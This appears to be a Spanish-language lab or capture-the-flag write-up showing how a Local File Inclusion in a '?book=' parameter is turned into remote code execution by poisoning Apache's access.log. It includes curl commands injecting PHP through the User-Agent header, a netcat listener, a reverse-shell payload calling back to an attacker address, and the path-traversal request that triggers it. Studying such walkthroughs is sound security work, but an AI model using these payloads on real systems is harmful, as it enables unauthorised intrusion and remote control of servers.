En Linux, Apache suele escribir registros en los directorios `/var/log/apache2/access.log` o `/var/log/httpd/access.log` dependiendo de tus anulaciones de OS y Host Virtual.

En la web vemos el siguiente indicio de Local File Inclusion:

![[Pasted image 20250713170842.png]]

Mediante la etiqueta `?book=` accede a recursos locales del sistema, veremos si podemos listar archivos sensibles de la máquina como el `/etc/passwd`.

![[Pasted image 20250713171058.png]]
![[Pasted image 20250713171129.png]]

Ahora intentaremos ver el archivo de logs de apache `access.log`.

![[Pasted image 20250713171546.png]]
![[Pasted image 20250713171517.png]]

En los logs vemos reflejado el `User-Agent`, el cual, con la herramienta `curl` podemos modificarlo para intentar inyectar código php malicioso y como la web interpreta php, vamos a poder ejecutar comandos de forma remota.

```
curl -s -X GET "http://192.168.1.40/" -H "User-Agent: <?php system('whoami'); ?>"
```

![[Pasted image 20250713172128.png]]

![[Pasted image 20250713172305.png]]

Vemos que podemos ejecutar comandos de forma remota intentaremos enviarnos una reverse shell a nuestra máquina atacante. Antes debemos ponernos en escucha en nuestra máquina atacante:

```
sudo nc -lvnp 443
```

Ahora enviamos el código malicioso a la web.

```
curl -s -X GET "http://192.168.1.40/" -H "User-Agent: <?php system('nc 192.168.1.33 443 -e /bin/bash'); ?>"
```

Y accedemos al recurso para que el código malicioso se ejecute:

```
curl -s -X GET  "http://192.168.1.40:8593/index.php?book=../../../../../../../../var/log/apache2/access.log"
```

![[Pasted image 20250713173155.png]]
